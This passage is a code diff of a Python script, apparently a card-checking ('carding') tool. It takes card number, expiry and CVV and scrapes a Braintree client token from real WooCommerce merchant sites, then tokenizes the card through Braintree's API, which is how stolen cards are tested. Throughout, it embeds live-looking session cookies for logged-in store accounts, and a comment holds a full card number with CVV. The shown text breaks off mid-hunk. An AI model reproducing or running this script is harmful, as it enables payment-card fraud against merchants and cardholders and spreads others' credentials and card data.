@@ -1,21 +1,14 @@
-def capture(string, start, end):
-    start_pos, end_pos = string.find(start), string.find(
-        end, string.find(start) + len(start)
-    )
-    return (
-        string[start_pos + len(start) : end_pos]
-        if start_pos != -1 and end_pos != -1
-        else None
-    )
-
-def Tele(ccx):
+def chk(card):
 	
 	import requests, re, base64, random, string, user_agent, time
 	from requests_toolbelt.multipart.encoder import MultipartEncoder
 	
+	from requests.packages.urllib3.exceptions import InsecureRequestWarning
 	
-	ccx = ccx.strip()
-	parts = re.split('[|/:]', ccx)
+	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+	
+	card = card.strip()
+	parts = re.split('[|/:]', card)
 	n = parts[0]
 	mm = parts[1]
 	yy = parts[2]
@@ -27,53 +20,46 @@ def Tele(ccx):
 	
 	r = requests.session()
 	
-	user = user_agent.generate_user_agent()
 
+
+
+
+
+
+
+
+
+
+
+	import requests
 
 	cookies = {
-    'cmplz_consented_services': '',
-    'cmplz_policy_id': '1',
-    'cmplz_marketing': 'allow',
-    'cmplz_statistics': 'allow',
-    'cmplz_preferences': 'allow',
-    'cmplz_functional': 'allow',
-    'cmplz_banner-status': 'dismissed',
-    '_gcl_au': '1.1.398331465.1715462987',
-    '_ga': 'GA1.1.1072405866.1715462992',
-    '_fbp': 'fb.1.1715462993103.2125891886',
-    '_pin_unauth': 'dWlkPU1XWTBOMkZtTW1NdE9EQmxZUzAwT0dNeExXRmtZVFl0TVRjNU5HTTJNelkxWm1SaQ',
-    'MCPopupClosed': 'yes',
-    'mailchimp_landing_site': 'https%3A%2F%2Fhusbands-paris.com%2Fen%2Fen%2Fmy-account%2Fadd-payment-method%2F',
-    '_clck': 'rlpr1c%7C2%7Cfn1%7C0%7C1592',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-06-29%2021%3A55%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Flost-password%2F%3Freset-link-sent%3Dtrue%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Flost-password%2F',
-    'sbjs_first_add': 'fd%3D2024-06-29%2021%3A55%3A28%7C%7C%7Cep%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Flost-password%2F%3Freset-link-sent%3Dtrue%7C%7C%7Crf%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Flost-password%2F',
+    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'njt-close-notibar': 'true',
-    'mailchimp.cart.current_email': 'qasfqotop@gmail.com',
-    'mailchimp_user_previous_email': 'qasfqotop%40gmail.com',
-    'mailchimp_user_email': 'qasfqotop%40gmail.com',
-    'wordpress_sec_efb38fd9efa18ec299b212a75f573725': 'qasfqotop%7C1720907780%7C4wd7GMwE2cKxlNjMX7NrBnaNKsLCKygY4s5QBj0jnJf%7Ca45fc10a57f88527bafc6bc8da15488dd7314d64039c8459f0af140d87d20e6a',
-    'wordpress_logged_in_efb38fd9efa18ec299b212a75f573725': 'qasfqotop%7C1720907780%7C4wd7GMwE2cKxlNjMX7NrBnaNKsLCKygY4s5QBj0jnJf%7C9eba9d0175b19f559fec194f0dac505ea9ab7a3d6e409ce4a020f0e898cd41b0',
-    'wp_woocommerce_session_efb38fd9efa18ec299b212a75f573725': '15313%7C%7C1719870967%7C%7C1719867367%7C%7C93fa9e19feee782a2536c6531fff9dc7',
-    'wfwaf-authcookie-7d0d490a75c9471b1f8c1a600eed0a0c': '15313%7Cother%7Cread%7Cc61509ff19975aa96ebc9ba9886acd7ccb74cf5142a932a1e98d8806f530e2d2',
-    'tinv_wishlistkey': 'c2eb41',
-    'tinvwl_wishlists_data_counter': '0',
-    'sbjs_session': 'pgs%3D16%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fhusbands-paris.com%2Fen%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_PVNDMDZCW4': 'GS1.1.1719697676.9.1.1719698393.44.0.0',
-    '_ga_MADEBYTALHA': 'GS1.1.1719697675.9.1.1719698393.0.0.1482634518',
-    '_clsk': '18gf9kt%7C1719698394193%7C16%7C1%7Cq.clarity.ms%2Fcollect',
+    'esale_number_dynamic_every_page': '01348858199',
+    '_ga': 'GA1.1.1805518627.1726761586',
+    'aa_click': '14098957664086814',
+    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
+    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
+    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
+    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
+    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
+    '_ga_E5SD97ZJ10': 'deleted',
+    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761726.0.0.0',
 }
 
 	headers = {
-    'authority': 'husbands-paris.com',
+    'authority': 'castlehottubs.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'no-cache',
-    'pragma': 'no-cache',
-    'referer': 'https://husbands-paris.com/en/my-account/payment-methods/',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    # 'cookie': 'sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; sbjs_session=pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761726.0.0.0',
+    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -85,70 +71,102 @@ def Tele(ccx):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 
-	res1 = requests.get('https://husbands-paris.com/en/my-account/add-payment-method/', cookies=cookies, headers=headers)
-	r4 = res1.text
-	anonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', r4).group(1)
-	T = capture(r4,'wc_braintree_client_token = ["','"]')
-	encoded_text = T
-	decoded_text = base64.b64decode(encoded_text).decode('utf-8')
-	au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
-	headers = {
-        'accept': '*/*',
-        'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
-        'authorization': f'Bearer {au}',
-        'braintree-version': '2018-05-10',
-        'content-type': 'application/json',
-        'origin': 'https://assets.braintreegateway.com',
-        'referer': 'https://assets.braintreegateway.com/',
-        'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'cross-site',
-        'user-agent': user,
-    }
+	response = requests.get('https://castlehottubs.co.uk/my-account/add-payment-method/', cookies=cookies, headers=headers)
 
-	json_data = {
-        'clientSdkMetadata': {
-            'source': 'client',
-            'integration': 'custom',
-            'sessionId': 'b17c9cd3-08a2-45ad-bf9b-c44450c8a642',
-        },
-        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
-        'variables': {
-            'input': {
-                'creditCard': {
-                    'number': n,
-                    'expirationMonth': mm,
-                    'expirationYear': yy,
-                    'cvv': cvc,
-                    'billingAddress': {
-                        'postalCode': '92866',
-                        'streetAddress': '1107 E Chapman Ave',
-                    },
-                },
-                'options': {
-                    'validate': False,
-                },
-            },
-        },
-        'operationName': 'TokenizeCreditCard',
-    }
 
-	res2 = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	token = res2.json()['data']['tokenizeCreditCard']['token']
+	add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
+	
+	client_token_nonce = re.search(r'"client_token_nonce":"(.*?)"', response.text).group(1)
+	
 
+
+
+
+
+
+
+	import requests
+
+	cookies = {
+    'wordpress_sec_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Cc37db7f8646f02d95112ddecd15ce235200d84d2e6373ed6fb21fb387426945d',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'esale_number_dynamic_every_page': '01348858199',
+    '_ga': 'GA1.1.1805518627.1726761586',
+    'aa_click': '14098957664086814',
+    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
+    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
+    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
+    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
+    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
+    '_ga_E5SD97ZJ10': 'deleted',
+    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761730.0.0.0',
+    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    'cookielawinfo-checkbox-necessary': 'yes',
+    'cookielawinfo-checkbox-functional': 'no',
+    'cookielawinfo-checkbox-performance': 'no',
+    'cookielawinfo-checkbox-analytics': 'no',
+    'cookielawinfo-checkbox-advertisement': 'no',
+    'cookielawinfo-checkbox-others': 'no',
+}
 
 	headers = {
-    'authority': 'api.braintreegateway.com',
+    'authority': 'castlehottubs.co.uk',
     'accept': '*/*',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'no-cache',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    # 'cookie': 'wordpress_sec_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Cc37db7f8646f02d95112ddecd15ce235200d84d2e6373ed6fb21fb387426945d; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; esale_number_dynamic_every_page=01348858199; _ga=GA1.1.1805518627.1726761586; aa_click=14098957664086814; __stripe_mid=511c1ddb-f227-4487-8668-852c8db824c4a765aa; __stripe_sid=b63c10a7-918c-4b85-aa1e-92fe60724759b594fa; wordpress_logged_in_aa79af48806932b5ccb036d6d955a819=negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e; wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819=20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759; wfwaf-authcookie-69502fc676204955e38628a39ff999c4=20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60; _ga_E5SD97ZJ10=deleted; _ga_E5SD97ZJ10=GS1.1.1726761604.1.1.1726761730.0.0.0; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F; cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-functional=no; cookielawinfo-checkbox-performance=no; cookielawinfo-checkbox-analytics=no; cookielawinfo-checkbox-advertisement=no; cookielawinfo-checkbox-others=no',
+    'origin': 'https://castlehottubs.co.uk',
+    'referer': 'https://castlehottubs.co.uk/my-account/add-payment-method/',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+	data = {
+    'action': 'wc_braintree_paypal_get_client_token',
+    'nonce': client_token_nonce,
+}
+
+	response = requests.post('https://castlehottubs.co.uk/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
+	
+	
+	enc = response.json()['data']
+	
+	dec = base64.b64decode(enc).decode('utf-8')
+	
+	au=re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
+	
+	
+	
+
+
+
+
+
+
+
+
+	import requests
+
+	headers = {
+    'authority': 'payments.braintree-api.com',
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'authorization': f'Bearer {au}',
+    'braintree-version': '2018-05-10',
     'content-type': 'application/json',
-    'origin': 'https://husbands-paris.com',
-    'pragma': 'no-cache',
-    'referer': 'https://husbands-paris.com/',
+    'origin': 'https://assets.braintreegateway.com',
+    'referer': 'https://assets.braintreegateway.com/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -159,122 +177,138 @@ def Tele(ccx):
 }
 
 	json_data = {
-    'amount': '0.00',
-    'browserColorDepth': 24,
-    'browserJavaEnabled': False,
-    'browserJavascriptEnabled': True,
-    'browserLanguage': 'ar',
-    'browserScreenHeight': 895,
-    'browserScreenWidth': 393,
-    'browserTimeZone': -180,
-    'deviceChannel': 'Browser',
-    'additionalInfo': {
-        'billingLine1': 'hheheheh',
-        'billingLine2': '',
-        'billingCity': 'hhhdbrb',
-        'billingState': 'NY',
-        'billingPostalCode': '10080',
-        'billingCountryCode': 'US',
-        'billingPhoneNumber': '+202683835383',
-        'billingGivenName': 'hehheheheb',
-        'billingSurname': 'hdhrhrbb',
-        'email': 'hfjfjgjfkfjjfjfj@gmail.com',
-    },
-    'bin': '440393',
-    'dfReferenceId': '0_2fbc997e-d3d4-4506-87b8-81355e086cae',
-    'clientMetadata': {
-        'requestedThreeDSecureVersion': '2',
-        'sdkVersion': 'web/3.101.1',
-        'cardinalDeviceDataCollectionTimeElapsed': 4101,
-        'issuerDeviceDataCollectionTimeElapsed': 1613,
-        'issuerDeviceDataCollectionResult': True,
-    },
-    'authorizationFingerprint': au,
-    'braintreeLibraryVersion': 'braintree/web/3.101.1',
-    '_meta': {
-        'merchantAppId': 'husbands-paris.com',
-        'platform': 'web',
-        'sdkVersion': '3.101.1',
+    'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'integrationType': 'custom',
-        'sessionId': 'b17c9cd3-08a2-45ad-bf9b-c44450c8a642',
+        'sessionId': '84203466-e2c2-42cf-8549-3dcce17df108',
     },
+    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
+    'variables': {
+        'input': {
+            'creditCard': {
+                'number': n,
+                'expirationMonth': mm,
+                'expirationYear': yy,
+                'cvv': cvc,
+            },
+            'options': {
+                'validate': False,
+            },
+        },
+    },
+    'operationName': 'TokenizeCreditCard',
 }
 
-	res3 = requests.post(
-    f'https://api.braintreegateway.com/merchants/tqrv56bq2khzqk35/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
-    headers=headers,
-    json=json_data,
-)
+	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
+
+# Note: json_data will not be serialized by requests
+# exactly as it was in the original request.
+#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"84203466-e2c2-42cf-8549-3dcce17df108"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"4744760199779614","expirationMonth":"03","expirationYear":"2026","cvv":"681"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
+#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
+	tok = response.json()['data']['tokenizeCreditCard']['token']
 
 
 
 
 
-	nonce = res3.json()['paymentMethod']['nonce']
-    
-    
 
 
 
 
-	
+
+
+
+
+
+
+
+
+
+
+
+	import requests
+
+	cookies = {
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2024-09-19%2015%3A59%3A43%7C%7C%7Cep%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
+    'esale_number_dynamic_every_page': '01348858199',
+    '_ga': 'GA1.1.1805518627.1726761586',
+    'aa_click': '14098957664086814',
+    '__stripe_mid': '511c1ddb-f227-4487-8668-852c8db824c4a765aa',
+    '__stripe_sid': 'b63c10a7-918c-4b85-aa1e-92fe60724759b594fa',
+    'wordpress_logged_in_aa79af48806932b5ccb036d6d955a819': 'negm2898%7C1727971198%7C9HpnWsDk3tGykfvBN5HWzszMvNNeDcLI20XYl1tDHO6%7Ca40311fa74d13d8d3332dba4349f7f4416edc7e648e582b55e65981b5526d92e',
+    'wp_woocommerce_session_aa79af48806932b5ccb036d6d955a819': '20130%7C%7C1726934379%7C%7C1726930779%7C%7C8e4d9506df589dc777aa7a8e6feb0759',
+    'wfwaf-authcookie-69502fc676204955e38628a39ff999c4': '20130%7Cother%7Cread%7C7e06657785b30db400ab83ed643c20d2ab471ac431cd46e27b744d5067b82f60',
+    '_ga_E5SD97ZJ10': 'deleted',
+    'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fcastlehottubs.co.uk%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_E5SD97ZJ10': 'GS1.1.1726761604.1.1.1726761726.0.0.0',
+}
 
 	headers = {
-    'authority': 'husbands-paris.com',
+    'authority': 'castlehottubs.co.uk',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'cache-control': 'no-cache',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
     'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://husbands-paris.com',
-    'pragma': 'no-cache',
-    'referer': 'https://husbands-paris.com/en/my-account/add-payment-method/',
